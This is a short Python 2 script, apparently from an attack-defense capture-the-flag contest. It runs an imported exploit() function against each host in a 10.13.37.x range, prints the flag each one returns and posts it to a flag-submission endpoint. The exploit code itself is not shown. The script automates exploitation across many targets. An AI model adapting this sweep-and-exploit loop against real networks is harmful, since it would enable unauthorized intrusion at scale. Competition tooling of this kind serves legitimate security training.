#!/usr/bin/env python


import requests
import sys
from fire import exploit

ip = "10.13.37."

URL = 'http://10.100.0.2/api/submit_flag/'

def submit_flag(flag):
    s = requests.post(url=URL+flag)
    s.encoding = 'utf-8-sig'
    return s.text

if __name__ == '__main__':
    for i in range(3,30):
        try:
            print "Fire!",ip+str(i)
            flag=exploit(ip+str(i))
            print flag
            print submit_flag(flag)
        except Exception as e:
            raise e
            print "Error",ip